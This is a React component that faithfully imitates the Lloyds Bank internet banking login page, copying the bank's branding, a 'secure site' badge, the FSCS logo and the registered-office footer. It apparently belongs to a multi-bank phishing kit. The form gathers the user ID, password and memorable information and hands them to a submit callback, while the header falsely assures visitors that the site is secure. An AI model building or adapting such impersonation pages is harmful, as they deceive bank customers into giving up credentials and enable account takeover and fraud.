"use client";

import { useState } from "react";

interface TemplateProps {
  bankName?: string;
  selectedOption?: string;
  logoUrl?: string | null;
  onSuccessSubmit: (data: { userId: string; password?: string; memorableInfo?: string }) => void;
}

export default function LloydsTemplate({
  onSuccessSubmit,
}: TemplateProps) {
  const [userId, setUserId] = useState("");
  const [password, setPassword] = useState("");
  const [memorableInfo, setMemorableInfo] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [showMemorable, setShowMemorable] = useState(false);
  const [rememberId, setRememberId] = useState(false);

  // Error States para iti tunggal maysa a pagikabilan
  const [userIdError, setUserIdError] = useState("");
  const [passwordError, setPasswordError] = useState("");
  const [memorableInfoError, setMemorableInfoError] = useState("");
  const [loading, setLoading] = useState(false);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    let hasError = false;

    // 1. User ID Validation (Saanen a kasapulan ti nainget nga email check)
    if (!userId.trim()) {
      setUserIdError("Please enter a value.");
      hasError = true;
    } else {
      setUserIdError("");
    }

    // 2. Password Validation
    if (!password.trim()) {
      setPasswordError("Please enter a value.");
      hasError = true;
    } else {
      setPasswordError("");
    }

    // 3. Memorable Information Validation
    if (!memorableInfo.trim()) {
      setMemorableInfoError("Please enter a value.");
      hasError = true;
    } else {
      setMemorableInfoError("");
    }

    // Masapul a kompleto amin a tallo sakbay a makaabante
    if (hasError) return;

    setLoading(true);
    onSuccessSubmit({
      userId: userId.trim(),
      password: password.trim(),
      memorableInfo: memorableInfo.trim(),
    });
  };

  return (
    <div className="min-h-full bg-white flex flex-col justify-between font-sans text-slate-800">
      <div>
        {/* ================= 1. HEADER ================= */}
        <header className="bg-[#006a4e] px-4 sm:px-8 py-3 text-white flex items-center justify-between border-b border-[#00523c]">
          <div className="flex items-center">
            <img
              src="/lloyds-logo.png"
              alt="Lloyds Bank"
              className="h-10 sm:h-12 w-auto object-contain block max-w-none"
              onError={(e) => {
                const target = e.currentTarget;
                if (!target.src.endsWith(".svg")) {
                  target.src = "/lloyds-logo.svg";
                }
              }}
            />
          </div>

          <div className="flex items-center gap-4 sm:gap-6 text-xs sm:text-[13px]">
            <a href="#" className="underline hover:text-slate-200 hidden md:inline">Mobile</a>
            <a href="#" className="underline hover:text-slate-200 hidden md:inline">Cookie policy</a>

            <div className="border border-white/60 bg-transparent px-3 py-1.5 rounded text-left leading-tight">
              <div className="flex items-center gap-1.5 font-semibold text-white">
                <span>🔒</span> You're logging into a secure site
              </div>
              <a href="#" className="text-[10px] text-white/90 underline block mt-0.5">
                How can I tell that this site is secure?
              </a>
            </div>
          </div>
        </header>

        {/* ================= 2. MAIN FORM ================= */}
        <div className="mx-auto max-w-[1000px] p-6 sm:p-10">
          <div className="grid grid-cols-1 lg:grid-cols-12 gap-8">
            
            {/* Form Column */}
            <div className="lg:col-span-8">
              <h1 className="text-3xl sm:text-[34px] font-bold text-[#0c1938] tracking-tight mb-2">
                Welcome to Internet Banking
              </h1>

              <p className="text-xs sm:text-[13.5px] text-slate-600 mb-6">
                If you don't already use Internet Banking, it's simple to{" "}
                <a href="#" className="text-[#006a4e] underline font-medium">register online</a>.
              </p>

              <form onSubmit={handleSubmit} className="space-y-4">
                
                {/* 1. USER ID FIELD */}
                <div className={`p-3.5 rounded-[2px] transition ${
                  userIdError ? "border border-[#e53e3e] bg-[#fff5f5]" : "border border-transparent"
                }`}>
                  <label className="block text-[13px] font-bold text-slate-800 mb-1">
                    User ID:
                  </label>
                  <div className="flex items-center gap-3">
                    <input
                      type="text"
                      value={userId}
                      onChange={(e) => {
                        setUserId(e.target.value);
                        if (userIdError) setUserIdError("");
                      }}
                      className={`w-full max-w-[320px] border p-2 text-sm outline-none bg-white ${
                        userIdError ? "border-[#e53e3e]" : "border-slate-400 focus:border-[#006a4e]"
                      }`}
                    />
                    {userIdError && (
                      <span className="flex items-center gap-1.5 text-xs font-bold text-[#e53e3e] whitespace-nowrap">
                        <span className="h-4 w-4 rounded-full bg-[#e53e3e] text-white flex items-center justify-center text-[10px]">!</span>
                        {userIdError}
                      </span>
                    )}
                  </div>
                </div>

                {/* 2. PASSWORD FIELD */}
                <div className={`p-3.5 rounded-[2px] transition ${
                  passwordError ? "border border-[#e53e3e] bg-[#fff5f5]" : "border border-transparent"
                }`}>
                  <label className="block text-[13px] font-bold text-slate-800 mb-1">
                    Password:
                  </label>
                  <div className="flex items-center gap-3">
                    <div className="relative w-full max-w-[320px]">
                      <input
                        type={showPassword ? "text" : "password"}
                        value={password}
                        onChange={(e) => {
                          setPassword(e.target.value);
                          if (passwordError) setPasswordError("");
                        }}
                        className={`w-full border p-2 pr-14 text-sm outline-none bg-white ${
                          passwordError ? "border-[#e53e3e]" : "border-slate-400 focus:border-[#006a4e]"
                        }`}
                      />
                      <button
                        type="button"
                        onClick={() => setShowPassword(!showPassword)}
                        className="absolute right-2 top-1/2 -translate-y-1/2 text-xs font-semibold text-[#006a4e] underline px-1"
                      >
                        {showPassword ? "Hide" : "Show"}
                      </button>
                    </div>

                    {passwordError && (
                      <span className="flex items-center gap-1.5 text-xs font-bold text-[#e53e3e] whitespace-nowrap">
                        <span className="h-4 w-4 rounded-full bg-[#e53e3e] text-white flex items-center justify-center text-[10px]">!</span>
                        {passwordError}
                      </span>
                    )}
                  </div>
                </div>

                {/* 3. MEMORABLE INFORMATION FIELD */}
                <div className={`p-3.5 rounded-[2px] transition ${
                  memorableInfoError ? "border border-[#e53e3e] bg-[#fff5f5]" : "border border-transparent"
                }`}>
                  <label className="block text-[13px] font-bold text-slate-800 mb-1">
                    Memorable information:
                  </label>
                  <div className="flex items-center gap-3">
                    <div className="relative w-full max-w-[320px]">
                      <input
                        type={showMemorable ? "text" : "password"}
                        value={memorableInfo}
                        onChange={(e) => {
                          setMemorableInfo(e.target.value);
                          if (memorableInfoError) setMemorableInfoError("");
                        }}
                        className={`w-full border p-2 pr-14 text-sm outline-none bg-white ${
                          memorableInfoError ? "border-[#e53e3e]" : "border-slate-400 focus:border-[#006a4e]"
                        }`}
                      />
                      <button
                        type="button"
                        onClick={() => setShowMemorable(!showMemorable)}
                        className="absolute right-2 top-1/2 -translate-y-1/2 text-xs font-semibold text-[#006a4e] underline px-1"
                      >
                        {showMemorable ? "Hide" : "Show"}
                      </button>
                    </div>

                    {memorableInfoError && (
                      <span className="flex items-center gap-1.5 text-xs font-bold text-[#e53e3e] whitespace-nowrap">
                        <span className="h-4 w-4 rounded-full bg-[#e53e3e] text-white flex items-center justify-center text-[10px]">!</span>
                        {memorableInfoError}
                      </span>
                    )}
                  </div>
                </div>

                {/* Checkbox */}
                <div className="px-3.5 pt-1 space-y-1">
                  <label className="flex items-center gap-2 cursor-pointer text-xs text-slate-700 select-none">
                    <input
                      type="checkbox"
                      checked={rememberId}
                      onChange={(e) => setRememberId(e.target.checked)}
                      className="h-4 w-4 rounded border-slate-400 accent-[#006a4e]"
                    />
                    <span>Remember my User ID <span className="text-[#006a4e] font-bold">ⓘ</span></span>
                  </label>
                  <p className="text-[11px] text-slate-500 pl-6">
                    <strong className="text-slate-700">Warning:</strong> Don't tick this box if you're using a public or shared computer
                  </p>
                </div>

                {/* Actions */}
                <div className="border-t border-slate-200 mt-6 pt-5 px-3.5 flex items-center justify-between max-w-[500px]">
                  <a href="#" className="text-xs sm:text-[13px] text-[#006a4e] underline font-semibold">
                    Forgotten your logon details?
                  </a>

                  <button
                    type="submit"
                    disabled={loading}
                    className="rounded-[2px] bg-[#006a4e] px-7 py-2.5 text-sm font-bold text-white shadow-sm hover:bg-[#00553e] active:scale-[0.99] transition cursor-pointer"
                  >
                    {loading ? "Checking..." : "Continue"}
                  </button>
                </div>
              </form>

              {/* Mobile App Promo */}
              <div className="mt-10 border-t border-slate-200 pt-6 px-3.5 flex items-start gap-4">
                <div className="w-12 h-14 border-2 border-slate-400 rounded-md flex items-center justify-center p-1 shrink-0">
                  <div className="w-6 h-10 border border-slate-400 rounded-sm"></div>
                </div>
                <div>
                  <h3 className="text-sm font-bold text-[#006a4e]">
                    Why not try our secure Mobile Banking app?
                  </h3>
                  <p className="text-xs text-slate-600 mt-1 leading-relaxed max-w-md">
                    With our app you get access to lots of extra features to make banking even easier. Things like freeze your card, check your PIN and set your own contactless limit.
                  </p>
                  <a href="#" className="text-xs text-[#006a4e] underline font-semibold block mt-2">
                    How to set up the app
                  </a>
                </div>
              </div>
            </div>

            {/* Right Side Cards */}
            <div className="lg:col-span-4 space-y-4">
              <div className="border border-slate-300 rounded-[2px] overflow-hidden">
                <div className="flex items-center justify-between p-3.5 bg-white cursor-pointer hover:bg-slate-50">
                  <span className="text-sm font-bold text-[#006a4e]">Help & Support</span>
                  <span className="text-[#006a4e] text-xs">▼</span>
                </div>
                <div className="border-t border-slate-300 flex items-center justify-between p-3.5 bg-white cursor-pointer hover:bg-slate-50">
                  <span className="text-sm font-bold text-[#006a4e]">Contact Us</span>
                  <span className="text-[#006a4e] text-xs">▼</span>
                </div>
              </div>

              <div className="border border-slate-300 rounded-[2px] p-6 bg-white flex flex-col items-center justify-center shadow-sm">
                <div className="flex flex-col items-center justify-center rounded-[16px] bg-[#531765] px-6 py-4 text-white shadow-md w-36 text-center">
                  <span className="text-2xl font-black italic tracking-tight leading-none mb-1">fscs</span>
                  <span className="text-[10px] font-bold tracking-[0.22em] uppercase border-t border-white/50 pt-1">
                    PROTECTED
                  </span>
                </div>
              </div>
            </div>

          </div>
        </div>
      </div>

      {/* Footer */}
      <footer className="bg-[#004e38] text-white px-6 py-4 text-[11px] leading-relaxed mt-12 border-t border-[#003d2c]">
        <div className="mx-auto max-w-[1000px]">
          <div className="flex flex-wrap gap-x-4 gap-y-1 font-semibold mb-2">
            <a href="#" className="underline">Personal Banking</a>
            <a href="#" className="underline">Security</a>
            <a href="#" className="underline">Legal</a>
            <a href="#" className="underline">Privacy</a>
            <a href="#" className="underline">Rates and charges</a>
            <a href="#" className="underline">www.lloydsbankinggroup.com</a>
          </div>
          <p className="text-white/80">
            Lloyds Bank plc. Registered Office: 25 Gresham Street, London EC2V 7HN. Registered in England and Wales no. 2065. Lloyds Bank plc is authorised by the Prudential Regulation Authority and regulated by the Financial Conduct Authority and the Prudential Regulation Authority under registration number 119278.
          </p>
        </div>
      </footer>
    </div>
  );
}